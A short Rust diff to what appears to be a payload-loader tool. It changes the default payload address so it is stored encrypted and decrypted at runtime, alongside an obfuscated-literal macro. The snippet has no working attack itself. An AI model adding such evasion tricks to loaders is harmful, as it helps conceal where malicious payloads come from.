@@ -1,11 +1,12 @@
 use std::env;
-use rustcrypt_ct_macros::obf_lit;
+use rustcrypt_ct_macros::{obf_lit};
+use crate::utils::simple_decrypt;
 
 pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let args: Vec<String> = env::args().collect();
     let address = if args.len() < 2 || args[1].is_empty() {
-        // 使用编译时配置的默认地址
-        env!("RSL_DEFAULT_PAYLOAD_ADDRESS").to_string()
+        // Decrypt the encrypted default address
+        simple_decrypt(env!("RSL_ENCRYPTED_DEFAULT_PAYLOAD_ADDRESS"))
     } else {
         args[1].clone()
     };
